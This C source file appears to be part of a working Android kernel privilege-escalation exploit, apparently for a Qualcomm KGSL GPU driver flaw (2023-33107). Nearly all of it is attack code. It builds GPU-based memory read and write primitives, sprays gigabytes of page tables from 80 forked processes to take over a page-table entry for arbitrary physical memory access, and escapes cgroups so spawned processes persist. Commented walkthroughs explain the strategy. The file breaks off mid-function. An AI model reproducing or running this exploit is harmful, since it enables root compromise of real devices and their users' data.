//===============================================================================================================
// aarch64-linux-android29-clang -o picohaxx picohaxx.c root.c term.c help.cpp cfg.c 2023-33107.c
// -O2 -Wl,--gc-sections -ffunction-sections -fdata-sections -llog
//===============================================================================================================
#include "picohaxx.h"
#include <linux/input.h>
#include "2023-33107.h"
#include <stdbool.h>
#include <stdio.h>
#include <time.h>
#include <unistd.h>
#include "bundle.h"
#include "cfg.h"
#include "term.h"

BUNDLE(start,"audio_escalate");
BUNDLE(fail, "audio_failed");
BUNDLE(success2, "audio_success");

#define inner_sleep 10
#define outer_sleep 1
#define spray_sleep 2000

extern int kgsl;

spray_slot_t *spray_ctrl;

char * gsharedbuf;
char **g_custom_spawn_args = NULL;
struct pte_hit g_found_pte  = {0,0,0,-1};

int g_sharedPage_fd=-1, do_memdump=0, g_chosen_pid = 0, g_chosen_idx = 0;

void do_exit(int i, char* msg) { 
    if(g_dbgchild) {
        snprintf(spray_ctrl[i].exitMessage, sizeof(spray_ctrl[i].exitMessage), "quit: %s\n", msg);
    }
    // spray_ctrl[i].pid=0;
    exit(0); 
}

// sneak our pid into inits cgroup
static void escape_cgroups(void)
{
    pid_t pid = getpid();
    char pid_str[32];
    snprintf(pid_str, sizeof(pid_str), "%d\n", pid);

    // just 'add-er-all'
    const char *targets[] = {
        "/acct/tasks",
        "/acct/cgroup.procs",
        "/dev/cpuctl/tasks",
        "/dev/cpuset/tasks",
        "/dev/stune/tasks",
        "/sys/fs/cgroup/cgroup.procs"
    };

    for (size_t i = 0; i < sizeof(targets) / sizeof(targets[0]); i++) {
        int fd = open(targets[i], O_WRONLY);
        if (fd >= 0) {
            write(fd, pid_str, strlen(pid_str));
            close(fd);
        }
    }
}

typedef struct {
    pid_t pid;
    int err;
} spawn_msg_t;
//========================================================================================#
// Spawn process, completely detached from parent / adb session / cgroup via double-fork
// Takes an explicitly constructed argv array where the last element must be NULL.
//========================================================================================#
int supaexecv(const char *filename, char *argv[])
{
    ifdbg2 {
        log2(cb("supaexecv\n======================\n") cy("%s"), filename);
        char **p = &argv[0];
        int a=0;
        while (*p) log2("argv[%d]:%s", a++, *p++);
        log2("======================");
    }

    if (!filename || !argv) { errno = EINVAL; return -1; }

    int pfd[2];
    if (pipe(pfd) != 0) return -1;

    int exec_pipe[2];
    if (pipe(exec_pipe) != 0) {
        close(pfd[0]); close(pfd[1]);
        return -1;
    }
    // Auto-close write end on successful exec (the magic trick)
    fcntl(exec_pipe[1], F_SETFD, FD_CLOEXEC);

    pid_t outer = fork();
    if (outer < 0) {
        close(pfd[0]); close(pfd[1]);
        close(exec_pipe[0]); close(exec_pipe[1]);
        return -1;
    }

    if (outer == 0) {
        // Outer child
        close(pfd[0]);
        setsid();

        pid_t inner = fork();
        if (inner < 0) {
            int e = errno;
            spawn_msg_t msg = { -1, e };
            write(pfd[1], &msg, sizeof(msg));
            close(pfd[1]);
            _exit(e);
        }

        if (inner == 0) {
            // Grandchild: detached, running in background
            close(pfd[1]);

             // we don't read in grandchild
            close(exec_pipe[0]);

            // survive adb disconnects
            escape_cgroups();

            // Detach standard file descriptors
            int devnull = open("/dev/null", O_RDWR);
            if (devnull >= 0) {
                dup2(devnull, STDIN_FILENO);
                dup2(devnull, STDERR_FILENO);
                dup2(devnull, STDOUT_FILENO);
                if (devnull > STDERR_FILENO) close(devnull);
            }

            // execv(filename, argv);
            execvp(filename, argv);
            
            // If exec fails, write errno to pipe and exit
            int e = errno;
            write(exec_pipe[1], &e, sizeof(int));
            _exit(e);
        }

        // Outer child: close write end so only grandchild has it
        close(exec_pipe[1]);

        // Wait for grandchild to exec (or fail)
        int exec_result = 0;
        ssize_t r = read(exec_pipe[0], &exec_result, sizeof(int));
        close(exec_pipe[0]);

        spawn_msg_t msg;
        if (r == sizeof(int)) {
            // execv failed (grandchild sent errno)
            msg.pid = -1;
            msg.err = exec_result;
        } else {
            // execv succeeded (EOF)
            msg.pid = inner;
            msg.err = 0;
        }
        write(pfd[1], &msg, sizeof(msg));
        close(pfd[1]);
        _exit(0);
    }

    // Parent process
    close(pfd[1]);
    close(exec_pipe[0]);
    close(exec_pipe[1]);

    spawn_msg_t msg;
    if (read(pfd[0], &msg, sizeof(msg)) != sizeof(msg)) {
        msg.pid = -1;
        msg.err = ECHILD;
    }
    close(pfd[0]);

    int status;
    waitpid(outer, &status, 0);

    if (msg.pid < 0) {
        errno = msg.err ? msg.err : ECHILD;
        ifdbg2 log2(red("execv failed: %s (%d)"), strerror(errno), errno);
        return -1;
    }
    ifdbg log2(green("Successfully spawned background process %s (%d)"), filename, msg.pid); 
    return (int)msg.pid;
}

//========================================================================================#
// Variadic wrapper for supaexecv 
//========================================================================================#
int supaexec(const char *filename, ...)
{
    if (!filename) { errno = EINVAL; return -1; }
    va_list ap;

    // First pass: read argv0 sentinel, then count remaining args
    va_start(ap, filename);
    const char *argv0_arg = va_arg(ap, const char *); 
    const char *argv0     = argv0_arg ? argv0_arg : filename;

    size_t n = 1;
    while (va_arg(ap, const char *) != NULL) ++n;
    va_end(ap);

    char **argv = (char **) malloc((n + 1) * sizeof(char *));
    if (!argv) { errno = ENOMEM; return -1; }

    // Second pass: fill argv
    argv[0] = (char *)argv0;
    va_start(ap, filename);
    va_arg(ap, const char *); // consume argv0 slot again
    
    size_t i = 1;
    const char *a;
    while ((a = va_arg(ap, const char *)) != NULL) {
        argv[i++] = (char *)a;
    }
    va_end(ap);
    argv[i] = NULL;

    // Call our array-based spawn
    int ret = supaexecv(filename, argv);
    
    free(argv);
    return ret;
}

// supaexec-formatted. command is a single string like system(), that can be formatted 
int supaexecf(const char *__fmt, ...)
{
    va_list args;
    va_start(args, __fmt);
    int len = vsnprintf(NULL, 0, __fmt, args);
    va_end(args);
    if (len < 0)
        return -1;

    char *cmd = (char *)malloc(len + 1);
    if (cmd == NULL)
    {
        return -1;
    }

    va_start(args, __fmt);
    vsnprintf(cmd, len + 1, __fmt, args);
    va_end(args);

    ifdbg2 log2("supaexecf formatted: %s", cmd);
    int result = supaexec("/system/bin/sh", "supaexecf", "-c", cmd, 0);
    free(cmd);
    return result;
}

static struct timespec now  = {0, 0}, last = {0, 0}, lastref = {0, 0};
#define TS_DIFF_NS(ts1, ts2) ((long long)(ts1.tv_sec  - ts2.tv_sec)  * 1000000000LL) + ((long long)(ts1.tv_nsec - ts2.tv_nsec))
double diff_no_update(const char* label/*int printDiff*/)
{
    clock_gettime(CLOCK_MONOTONIC, &now);
    double ms = 0.0;
    if (last.tv_sec != 0 || last.tv_nsec != 0) {
        long long ns = TS_DIFF_NS(now, last);
        ms = ns / 1000000.0;
    } else {
        if(label) log2("⌛ reference: %s", label);
        return ms;
    }
    if(label) {
        log2("⌛ [%.3f ms] %s", ms, label);
    }

    return ms;
}

double diff(const char* label)
{
    double d=diff_no_update(label);
    last = now;
    return d;
}

int wait_timestamp(int fdx, unsigned ctx_id, unsigned target) {
    struct kgsl_cmdstream_readtimestamp_ctxtid r = {0};
    r.context_id = ctx_id; r.type = KGSL_TIMESTAMP_RETIRED;
    for (unsigned spins=0; spins<100000; ++spins) {
        if (ioctl(fdx, IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID, &r) != 0) return -1;
        if (r.timestamp >= target) return 0;
        usleep(100);
    }
    return -2;
}

int gpu_read(uint64_t src_gpu_va, uint32_t *out_data, size_t num_dwords)
{
    if(simulated()) return 0;

    struct kgsl_drawctxt_create ctx = { .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC };
    if (ioctl(kgsl, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx) != 0) {
        log2("[-] gpu_read: DRAWCTXT_CREATE: %s", strerror(errno));
        return -1;
    }
    unsigned ctx_id = ctx.drawctxt_id;
    int ret = -1;
    struct kgsl_drawctxt_destroy destroy = { .drawctxt_id = ctx_id };

    size_t ib_mmapsize = PAGE_ALIGN((num_dwords * 6 + 4) * 4);
    if (ib_mmapsize == 0) ib_mmapsize = PAGE_SIZE;
    struct kgsl_gpuobj_alloc ib_alloc = { .size = ib_mmapsize, .flags = KGSL_MEMFLAGS_USE_CPU_MAP };
    if (ioctl(kgsl, IOCTL_KGSL_GPUOBJ_ALLOC, &ib_alloc) != 0) {
        log2("[-] gpu_read: IB GPUOBJ_ALLOC: %s", strerror(errno));
        goto fail_ctx;
    }
    void *ib_vma = mmap(NULL, ib_alloc.mmapsize, PROT_READ | PROT_WRITE, MAP_SHARED, kgsl, ((off_t)ib_alloc.id) << 12);
    if (ib_vma == MAP_FAILED) {
        log2("[-] gpu_read: IB mmap: %s", strerror(errno));
        goto fail_ib_alloc;
    }

    struct kgsl_gpuobj_info info = { .id = ib_alloc.id };
    if (ioctl(kgsl, IOCTL_KGSL_GPUOBJ_INFO, &info) != 0) {
        log2("[-] gpu_read: IB GPUOBJ_INFO: %s", strerror(errno));
        goto fail_ib;
    }
    uint64_t ib_gpu = info.gpuaddr;

    struct kgsl_gpuobj_alloc dst_alloc = { .size = PAGE_ALIGN(num_dwords * 4), .flags = KGSL_MEMFLAGS_USE_CPU_MAP };
    if (ioctl(kgsl, IOCTL_KGSL_GPUOBJ_ALLOC, &dst_alloc) != 0) {
        log2("[-] gpu_read: DST GPUOBJ_ALLOC: %s", strerror(errno));
        goto fail_ib;
    }
    void *dst_vma = mmap(NULL, dst_alloc.mmapsize, PROT_READ | PROT_WRITE, MAP_SHARED, kgsl, ((off_t)dst_alloc.id) << 12);
    if (dst_vma == MAP_FAILED) {
        log2("[-] gpu_read: DST mmap: %s", strerror(errno));
        goto fail_dst_alloc;
    }

    info.id = dst_alloc.id;
    if (ioctl(kgsl, IOCTL_KGSL_GPUOBJ_INFO, &info) != 0) {
        log2("[-] gpu_read: DST GPUOBJ_INFO: %s", strerror(errno));
        goto fail_dst;
    }
    uint64_t dst_gpu = info.gpuaddr;

    uint32_t *cmd = (uint32_t *)ib_vma;
    int dw = 0;
    cmd[dw++] = cp_type7_packet(CP_NOP, 0);

    for (size_t i = 0; i < num_dwords; i++) {
        uint32_t d_lo, d_hi, s_lo, s_hi;
        split64(dst_gpu + (i * 4), &d_lo, &d_hi);
        split64(src_gpu_va + (i * 4), &s_lo, &s_hi);
        cmd[dw++] = cp_type7_packet(CP_MEM_TO_MEM, 5);
        cmd[dw++] = 0;
        cmd[dw++] = d_lo; cmd[dw++] = d_hi;
        cmd[dw++] = s_lo; cmd[dw++] = s_hi;
    }
    cmd[dw++] = cp_type7_packet(CP_NOP, 0);
    msync(ib_vma, dw * 4, MS_SYNC);

    struct kgsl_command_object cmd_obj = { .gpuaddr = ib_gpu, .size =           dw * 4, .flags = KGSL_CMDLIST_IB, .id = ib_alloc.id };

    struct kgsl_gpu_command gpu_cmd = { .cmdlist = (uint64_t)&cmd_obj, .cmdsize = sizeof(cmd_obj), .numcmds = 1, .context_id = ctx_id };

    if (ioctl(kgsl, IOCTL_KGSL_GPU_COMMAND, &gpu_cmd) != 0) {
        log2("[-] gpu_read: GPU_COMMAND: %s", strerror(errno));
        goto fail_dst;
    }
    if (wait_timestamp(kgsl, ctx_id, gpu_cmd.timestamp) != 0) {
        log2("[-] gpu_read: wait_timestamp: %s", strerror(errno));
        goto fail_dst;
    }
    msync(dst_vma, num_dwords * 4, MS_SYNC | MS_INVALIDATE);
    memcpy(out_data, dst_vma, num_dwords * 4);
    ret = 0;

fail_dst:
    munmap(dst_vma, dst_alloc.mmapsize);
fail_dst_alloc:
    { struct kgsl_gpuobj_free fr_dst = { .id = dst_alloc.id }; ioctl(kgsl, IOCTL_KGSL_GPUOBJ_FREE, &fr_dst); }
fail_ib:
    munmap(ib_vma, ib_alloc.mmapsize);
fail_ib_alloc:
    { struct kgsl_gpuobj_free fr_ib = { .id = ib_alloc.id }; ioctl(kgsl, IOCTL_KGSL_GPUOBJ_FREE, &fr_ib); }
fail_ctx:
    ioctl(kgsl, IOCTL_KGSL_DRAWCTXT_DESTROY, &destroy);
    return ret;
}

int gpu_write(uint64_t dst_gpu_va, uint32_t *data, size_t num_dwords)
{
    if(simulated()) return 0;
    struct kgsl_drawctxt_create ctx = { .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC };
    if (ioctl(kgsl, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx) != 0) {
        log2("[-] gpu_write: DRAWCTXT_CREATE: %s", strerror(errno));
        return -1;
    }
    unsigned ctx_id = ctx.drawctxt_id;

    struct kgsl_drawctxt_destroy destroy = { .drawctxt_id = ctx_id };
    int ret = -1;

    size_t ib_mmapsize = PAGE_ALIGN((num_dwords + 4) * 4);
    struct kgsl_gpuobj_alloc ib_alloc = { .size = ib_mmapsize, .flags = KGSL_MEMFLAGS_USE_CPU_MAP };
    if (ioctl(kgsl, IOCTL_KGSL_GPUOBJ_ALLOC, &ib_alloc) != 0) {
        log2("[-] gpu_write: IB GPUOBJ_ALLOC: %s", strerror(errno));
        goto fail_ctxw;
    }
    void *ib_vma = mmap(NULL, ib_alloc.mmapsize, PROT_READ | PROT_WRITE, MAP_SHARED, kgsl, ((off_t)ib_alloc.id) << 12);
    if (ib_vma == MAP_FAILED) {
        log2("[-] gpu_write: IB mmap: %s", strerror(errno));
        goto fail_ib_allocw;
    }

    struct kgsl_gpuobj_info info = { .id = ib_alloc.id };
    if (ioctl(kgsl, IOCTL_KGSL_GPUOBJ_INFO, &info) != 0) {
        log2("[-] gpu_write: IB GPUOBJ_INFO: %s", strerror(errno));
        goto fail_ibw;
    }
    uint64_t ib_gpu = info.gpuaddr;

    uint32_t *cmd = (uint32_t *)ib_vma;
    int dw = 0;
    cmd[dw++] = cp_type7_packet(CP_NOP, 0);

    uint32_t d_lo, d_hi;
    split64(dst_gpu_va, &d_lo, &d_hi);
    cmd[dw++] = cp_type7_packet(CP_MEM_WRITE, 2 + num_dwords);
    cmd[dw++] = d_lo;
    cmd[dw++] = d_hi;
    for (size_t i = 0; i < num_dwords; i++) {
        cmd[dw++] = data[i];
    }
    cmd[dw++] = cp_type7_packet(CP_NOP, 0);
    msync(ib_vma, dw * 4, MS_SYNC);

    struct kgsl_command_object cmd_obj = { .gpuaddr = ib_gpu, .size = dw * 4, .flags = KGSL_CMDLIST_IB, .id = ib_alloc.id };
    struct kgsl_gpu_command gpu_cmd = { .cmdlist = (uint64_t)&cmd_obj, .cmdsize = sizeof(cmd_obj), .numcmds = 1, .context_id = ctx_id };

    if (ioctl(kgsl, IOCTL_KGSL_GPU_COMMAND, &gpu_cmd) != 0) {
        log2("[-] gpu_write: GPU_COMMAND: %s", strerror(errno));
        goto fail_ibw;
    }
    if (wait_timestamp(kgsl, ctx_id, gpu_cmd.timestamp) != 0) {
        log2("[-] gpu_write: wait_timestamp: %s", strerror(errno));
        goto fail_ibw;
    }
    ret = 0;

fail_ibw:
    munmap(ib_vma, ib_alloc.mmapsize);
fail_ib_allocw:
    { struct kgsl_gpuobj_free fr_ib = { .id = ib_alloc.id }; ioctl(kgsl, IOCTL_KGSL_GPUOBJ_FREE, &fr_ib); }
fail_ctxw:
    ioctl(kgsl, IOCTL_KGSL_DRAWCTXT_DESTROY, &destroy);
    return ret;
}

int gpu_write32(uint64_t dst_gpu_va, uint32_t value) {
    return gpu_write(dst_gpu_va, &value, 1);
}

int gpu_write64(uint64_t dst_gpu_va, uint64_t value) {
    uint32_t data[2];
    split64(value, &data[0], &data[1]);
    return gpu_write(dst_gpu_va, data, 2);
}

void dump_gpumem(uint64_t va, unsigned int size, unsigned int dwords_perIoctl, const char* filename)
{
    log2("\n[*] Dumping 0x%llx (%u bytes, %f.2) GPU MEMORY to %s", (unsigned long long)va, size, (float) size / 1024 / 1024, filename);
    diff(0);

    int out_fd = open(filename, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (out_fd < 0) { perror("[!] Failed to open dump file"); return; }

    unsigned int dwords_total = (size + 3) / 4;
    unsigned int dwords_dumped = 0;
    uint32_t *chunk_data = malloc(dwords_perIoctl * 4);

    while (dwords_dumped < dwords_total) {
        unsigned int chunk = dwords_total - dwords_dumped;
        if (chunk > dwords_perIoctl) chunk = dwords_perIoctl;

        if (gpu_read(va + (dwords_dumped * 4), chunk_data, chunk) != 0) {
            log2("\n[!] gpu_read failed at chunk offset 0x%x", dwords_dumped * 4);
            break;
        }

        unsigned int bytes_to_write = (dwords_dumped + chunk == dwords_total) ?
                                      (size - (dwords_dumped * 4)) : (chunk * 4);
        write(out_fd, chunk_data, bytes_to_write);

        if (dwords_dumped % (4096*1000) == 0) {
            float pct = ((float)(dwords_dumped * 4) / (float)size) * 100.0f;
            log2("\n    Progress: %u / %u bytes (%.1f%%)", dwords_dumped * 4, size, pct);
        }
        dwords_dumped += chunk;
    }
    free(chunk_data);
    close(out_fd);
    diff("[+] Dump complete.\n");
}

//=========================================================================================================================
// "In sowjet russia, pagetable looks up you."
//=========================================================================================================================
// Note: this is my first, lame attempt at a page table spray. Scanning memory is slow here. So i tried to turn things 
// around. If we're standing kneedeep in PTEs, we don't need to search a lot. Theoretically speaking, the scanning effort 
// could be made 0, if we we're to spray all available memory with nothing but ptes. Of course that's not possible, but 
// could pure mass actually be a feasible trade-off here? 
// This got me curious... 
// How much memory can the Kernel turn into leaf ptes on this 8gb device? (spoiler: a crazy amount)
// And how long does that take? A lot less than you'd think. 
//
// When spraying pagetables like this, you can only juice so many from a single process without hitting limits, 
// i found 80 child sprayers to be a good balance here.
// The Strategy:
// A single leaf pagetable occupies exactly one 4k page and holds 512 PTEs. On arm64 with 4k pages, one L3 table covers 
// a 2MB virtual address range (512 × 4k = 2MB). Mapping a single 4k page at the start of a 2MB aligned chunk 
// forces the kernel to allocate a full 4k L3 table even though we fill only 1 PTE – the other 511 stay empty.
// As a nice side effect, the resulting pagetables are trivial to spot. It's always the same 64bit pointer at offset 0
// in an otherwise emtpy 4K Page.
// So this is the core of the spray. The parent creates a small 4k dummy file and fills it with a know pattern (AAAA).
// Then we fork 80 children. Each child reserves a large anonymous region (32GB / PROT_NONE) aka 'many_gigs'
// and carefully aligns its start to 2MB. The alignment guarantees that every 2MB block corresponds to exactly one
// L3 table, so no table is shared between two file mappings. Now inside this region the child maps the very same
// 4k dummy file at every 2MB aligned position using MAP_FIXED. Because that physical page is shared, we consume
// almost NO real memory (well not for data). By touching the page we force instantiation of a PTE in each L3 table.
// So what really keeps growing here is the kernel's page table structures!
//
// Let's do the math:
// 32GB / 2MB = 16384 L3 tables * 4k = 67108864 ~64MB * 80 childs.
// Jesus christ, we're producing 5120mb made of nothing but *pure* pagetables.
// You won't have have to spend a lot of time scanning for those, they will come looking for you xD
// Then we just change the physical address. The child that sees anything other than 'AAAA' owns the mapping
// and will provide us arbitrary phys rw from here on.
//======================================================================================================================
const int num_sprayers      = 80;
const uint64_t many_gigs    = 32ULL * 1024 * 1024 * 1024 ;
const int such_spray        = many_gigs / MB(2); // 16384
//======================================================================================================================

// this wraps the whole lifecycle of a single sprayer process
void pte_sprayer_main(int i)
{
    if(g_dbgchild)  clock_gettime(CLOCK_MONOTONIC, &spray_ctrl[i].t[0]);
    pte_sprayer_emitt(i);
    if(g_dbgchild)  clock_gettime(CLOCK_MONOTONIC, &spray_ctrl[i].t[1]);

    chlog("pte_sprayer - waiting...");
    while(1) {
        if (spray_ctrl[i].do_action == CMD_IDENTFY) {
            pte_sprayer_check_your_mappings(i);
            // only the chosen child returns alive
            physmem_operator(i);
        }
        sleepms(outer_sleep);
        if (spray_ctrl[num_sprayers].do_action != -1) {
            do_exit(i, "outer loop, someone else found the mapping!");
        }
    }
    return;
}

void pte_sprayer_emitt(int i)
{
    close(kgsl);
    chlog("pte_sprayer_emitt - set_name");

    // sets up mappings
    char proc_name[16];
    pid_t self = getpid();
    snprintf(proc_name, sizeof(proc_name), SPRAYER_COMM, self);
    prctl(PR_SET_NAME, proc_name, 0, 0, 0);

    spray_ctrl[i].pid = self;
    spray_ctrl[i].do_action = 0;

    static const size_t alignment = MB(2);
    void *base = mmap(NULL, many_gigs + alignment, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (base != MAP_FAILED) {
        base=(void*)(((uintptr_t) base + (alignment - 1)) & ~(alignment - 1));
        spray_ctrl[i].base = base;
        // now every 2MB...
        for (size_t offset = 0; offset < many_gigs; offset += MB(2)) {
            void *target = (char *)base + offset;
            // we map the file, a single 4k page
            void *res = mmap(target, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, g_sharedPage_fd, 0);
            if (res != MAP_FAILED) {
                // and make the kernel build a pte here
                volatile char c = *(volatile char *)target;
                spray_ctrl[i].mappings++;
            }else {
                log2("%d: pte_sprayer_emitt - failed to mmap shared file", i);
                return;
            }

            // someone else already finished?
            if (spray_ctrl[num_sprayers].do_action != -1) {
                spray_ctrl[i].scanned=-1;
                do_exit(i, "pte_sprayer_emitt, someone else found the mapping");
            }

            //  not done spraying, but the parent process already found a pte.
            //  just stop here and go straight to indentification
            if (spray_ctrl[i].do_action == CMD_IDENTFY) {
                return;
            }

        }
    } else {
        log2(red("mmap %ull bytes failed in child %d"),  spray_ctrl[i].pid);
        do_exit(i, "pte_sprayer_emitt - failed to mmap region");
    }
}

void pte_sprayer_check_your_mappings(int i)
{
    int im_the_one = 0;

    if(spray_ctrl[i].mappings == 0) goto bye;
    
    // iterate (backwards) over spray locations
    for (size_t b = spray_ctrl[i].mappings-1; b != 0; b--) {
        uint64_t test_va = (uintptr_t)spray_ctrl[i].base + (b * MB(2));

        // Check if physical content differs (because parent changed one pte)
        if (*(volatile unsigned char *)test_va != 0x41) {
            im_the_one = 1;
            spray_ctrl[num_sprayers].do_action = i;
            spray_ctrl[i].pte_mapping = (void*)test_va;  // Store exact hit address
            break;
        }

        spray_ctrl[i].scanned++;
        
        // someone else found it?
        if(spray_ctrl[num_sprayers].do_action != -1) goto bye;
    }

    if(g_dbgchild) clock_gettime(CLOCK_MONOTONIC, &spray_ctrl[i].t[2]);

    if (im_the_one) {
        spray_ctrl[num_sprayers].do_action = i;   // signal our index to everyone on the "roof"
        spray_ctrl[i].do_action = 0;              // Wait for next instruction
        diff_no_update("[+] found mapping.");

        log2("[+] CHILD %d:  Aw crap, i just saw the memory change right there! So much for leaving work early today :/", getpid());
        ifdbg2 hexdump(spray_ctrl[i].pte_mapping, 32, "spray_ctrl[i].pte_mapping", 0);
    } else {
        bye:;
        spray_ctrl[num_sprayers].numchilds--;
        do_exit(i, "i'm not the one");
        return;
    }
}

void physmem_operator(int i)
{
    log2("[13] physmem operator at your service!");
    while(1) {
        __asm__ __volatile__("yield" ::: "memory");

        int action = spray_ctrl[i].do_action;

        if (action == CMD_READPAGE) {
            pseudo_flushTLB();
            memcpy(gsharedbuf, spray_ctrl[i].pte_mapping, 4096);
            spray_ctrl[i].do_action = 0;
        }
        else if (action == CMD_QUIT) {
            spray_ctrl[i].do_action = 0;
            do_exit(i, "got CMD_QUIT in pte_sprayer_main");
        }
        if(spray_ctrl[i].do_action >= CMD_READ64) {
            pseudo_flushTLB();
            uint64_t data           = spray_ctrl[i].data;
            uint64_t pageofffset    = spray_ctrl[i].address;
            u_int8_t* ptr8          = (u_int8_t*) (spray_ctrl[i].pte_mapping) + pageofffset;
            u_int32_t* ptr32        = (u_int32_t*) ptr8;
            u_int64_t* ptr64        = (u_int64_t*) ptr8;

            ifdbg2 log2("i %s %lX at %016lX, byteoffset %04lX",
                (spray_ctrl[i].do_action >= CMD_WRITE64) ? "write":"read", data,
                (uint64_t)ptr8, pageofffset);

            switch(spray_ctrl[i].do_action) {
                case CMD_WRITE8:
                    if(ptr8) *ptr8=data;
                    ifdbg2 log0("%s", "written");
                    break;
                case CMD_WRITE32:
                    if(ptr32) *ptr32=data;
                    ifdbg2 log0("%s", "written");
                    break;
                case CMD_WRITE64:
                    if(ptr64) *ptr64=data;
                    ifdbg2 log0("%s", "written");
                    break;
                case CMD_READ8:
                    if(ptr8) data=*ptr8;
                    ifdbg2 log0("read8: %016lX", data);
                    spray_ctrl[i].data = data;
                    break;
                case CMD_READ32:
                    if(ptr32) data=*ptr32;
                    ifdbg2 log0("read32: %016lX", data);
                    spray_ctrl[i].data = data;
                    break;
                case CMD_READ64:
                    if(ptr64) data=*ptr64;
                    ifdbg2 log0("read64: %016lX", data);
                    spray_ctrl[i].data = data;
                    break;
            }

            spray_ctrl[i].do_action = 0;
        }
        else {
            // action == 0 (Idle)
            sleepms(inner_sleep);
        }
    }
}

void pseudo_flushTLB0()
{
    void *p = mmap(NULL, 4096, PROT_WRITE|PROT_READ, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    munmap(p, 4096);
}

void pseudo_flushTLB()
{
    // pseudo_flushTLB()   5.428 ms
    // pseudo_flushTLB0()  0.121 ms
    pseudo_flushTLB0();

    // we touch ~2000 Pages to flush the TLB? (8 MB).
    static char *thrash_mem = NULL;
    static const size_t thrash_size = 8 * 1024 * 1024;

    if (!thrash_mem) {
        thrash_mem = (char*)mmap(NULL, thrash_size, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
        if (thrash_mem != MAP_FAILED) {
            madvise(thrash_mem, thrash_size, 14); // MADV_NOHUGEPAGE prevent 2MB THP pages
        }
    }

    if (thrash_mem && thrash_mem != MAP_FAILED) {
        volatile char sum = 0;
        // touch each page
        for (size_t i = 0; i < thrash_size; i += 4096) {
            thrash_mem[i] = 1;
            sum += thrash_mem[i];
        }
    }
}

// this sprays exactly 1 shit-ton of PTES 
int STAGE_2_PTE_Spray()
{
    log2("[11] Spraying pagetables...");
    //  PCP DRAIN to nudge the kernel to reuse our UAF memory
    size_t drain_size = 64 * 1024 * 1024;
    void *drain = mmap(NULL, drain_size, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (drain != MAP_FAILED) {
        for(size_t i = 0; i < drain_size; i += PAGE_SIZE) {
            ((volatile char*)drain)[i] = 'D';
        }
    }

    //  4k dummy file we map in each sprayed pte
    g_sharedPage_fd = open("/data/local/tmp/pte_dummy", O_RDWR | O_CREAT | O_TRUNC, 0666);
    if (g_sharedPage_fd < 0) { perror("open pte_dummy"); return -1; }
    char dummy_data[PAGE_SIZE];
    memset(dummy_data, 'A', PAGE_SIZE);
    write(g_sharedPage_fd, dummy_data, PAGE_SIZE);

    int spray_success = 0;

    // roof index, shared by all
    spray_ctrl[num_sprayers].pid=0;
    spray_ctrl[num_sprayers].do_action=-1;
    spray_ctrl[num_sprayers].numchilds=num_sprayers;

    // start forking childs
    for (int i = 0; i < num_sprayers; i++) {
        pid_t pid = fork();

        // CHILD happens here
        if (pid == 0) {
            pte_sprayer_main(i);
            do_exit(i, "because i returned from pte_sprayer_main");
        }
        else if (pid > 0) {
            // PARENT PROCESS
            spray_ctrl[i].pid = pid;
            spray_success++;
        }
    }

    double gigs=(double)many_gigs/(1024*1024*1024);
    double pteGB=many_gigs / MB(2) * 4096 * spray_success / 1024 / 1024 / 1024;

    log2("[+] Forked %d sprayer processes * %.2f GB regions (%.2f GB) %d mappings", spray_success, gigs, gigs*spray_success, such_spray);
    log2("= %.2f GB PTEs.", pteGB);
    log2("[*] Waiting %d ms for PTE construction...", spray_sleep);
    sleepms(spray_sleep);
    return spray_success;
}

int PollInput()
{
    if(kbhit()) {
        int key=getch();
        if(key==0x20) {
            log2("* pause *");
            while(getch()!=0x20);
        } else if (key==27){
            log2("* press escape again to abort *");
            if(getch()==27) {
                return 1;
            }
        }
    }
    return 0;
}

// brutally murder all of the children (not kevin though)
void kill_all_childs(int except)
{
    int nAlive = 0;
    for (int i = 0; i < num_sprayers; i++) {
        if (spray_ctrl[i].pid > 0) {
            nAlive++;
        }
    }
    if(nAlive == 0) return;

    // restore pte before releasing the last child 
    if(except != -1) {
        Restore_PTE();
    }

    char msg[256]={0};
    strcatf(msg, "killing all child processes (%d)... ", nAlive);
    if(except != -1) strcatf(msg, "[except %d]", except);

    if(nAlive >1) diff_no_update(msg);

    int nKilled = 0;
    for (int i = 0; i < num_sprayers; i++) {
        if ((spray_ctrl[i].pid > 0) && (spray_ctrl[i].pid != except)) {
            kill(spray_ctrl[i].pid, SIGKILL);
            nKilled++;
        }
    }

    if(nAlive > 1) log2("i sent %d SIGKILLs...", nKilled);
    for (int i = 0; i < num_sprayers; i++) {
        if ((spray_ctrl[i].pid > 0) && (spray_ctrl[i].pid != except)) {
            waitpid(spray_ctrl[i].pid, NULL, 0);
            spray_ctrl[i].pid=-1;
            if(g_dbgchild) clock_gettime(CLOCK_MONOTONIC, &spray_ctrl[i].t[3]);
        }
    }
    if(nAlive > 1) diff_no_update("they're probably dead.");
}


int STAGES_3to5_FIND_EXPLOIT_EXEC()
{
    diff_no_update("starting scan for PTEs...");
    int pages_scanned = 0, n, ret=0;
    const size_t chunk_size = 64 * 1024;
    uint32_t *buffer = malloc(chunk_size);
    uint64_t end_va = UAF_START + UAF_SIZE;

    memset(&g_found_pte,0, sizeof(g_found_pte));

    for (uint64_t va = UAF_START; va < end_va; va += chunk_size) {

        if (pages_scanned % 1000 == 0) {
            log2("\nProgress: %d pages (%.1f%%)", pages_scanned, (pages_scanned*100.0)/((float)UAF_SIZE/PAGE_SIZE));
            if(PollInput()) { 
                goto fatal;
            }
        }
        pages_scanned += chunk_size / PAGE_SIZE;
        if (gpu_read(va, buffer, chunk_size / 4) != 0) continue;

        // for each 4KB Page in chunk
        for (int p = 0; p < chunk_size / PAGE_SIZE; p++) {
            uint64_t *page = (uint64_t *)((uint8_t *)buffer + (p * PAGE_SIZE));

            int non_zero_count = 0;
            int last_index = -1;

            // count non-null entries
            for (int i = 0; i < 512; i++) {
                if (page[i] != 0) {
                    non_zero_count++;
